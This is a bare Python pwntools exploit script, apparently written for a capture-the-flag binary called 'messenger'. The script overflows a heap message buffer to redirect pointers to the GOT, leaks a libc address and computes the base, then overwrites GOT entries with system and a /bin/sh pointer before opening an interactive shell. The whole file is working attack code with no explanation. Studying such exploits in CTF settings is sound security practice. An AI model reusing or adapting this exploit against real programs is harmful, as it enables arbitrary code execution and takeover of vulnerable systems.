from pwn import *

sbrk_got=0x602048
target=0x6020b8


p=process("./messenger")

def leave_messsage(size,data):
    p.sendline("L")
    print p.recv()
    p.sendline(str(size))
    print p.recv()
    p.sendline(data)
    print p.recv()
def change_message(index,size,data):
    p.sendline("C")
    print p.recv()
    p.sendline(str(index))
    print p.recv()
    p.sendline(str(size))
    print p.recv()
    p.sendline(str(data))
    print p.recv()

def remove_message(index):
    p.sendline("R")
    print p.recv()
    p.sendline(str(index))


print p.recv()
leave_messsage(10,"A")
leave_messsage(10,"B")

payload="A"*32+p64(sbrk_got)+p64(target)
change_message(0,100,payload)
remove_message(1)

#libc leak
p.sendline("V")
print p.recv()
p.sendline("0")
sbrk=u64(p.recv(6)+"\x00\x00")
libc_base=sbrk-0xfc290
system=libc_base+0x45390
bin_sh=libc_base+0x18c177
setvbuf=libc_base+0x6fe70
scanf=libc_base+0x6a7e0
exit=libc_base+0x3a030
print p.recv()

print 'sbrk -> ',hex(sbrk)
print 'system ->',hex(system)
print 'bin_sh ->',hex(bin_sh)

payload=p64(sbrk)+"AAAAAAAA"+p64(system)+p64(setvbuf)+p64(scanf)+p64(exit)+"\x00"*0x18+p64(bin_sh)
change_message(0,400,payload)
p.sendline("L")




p.interactive()
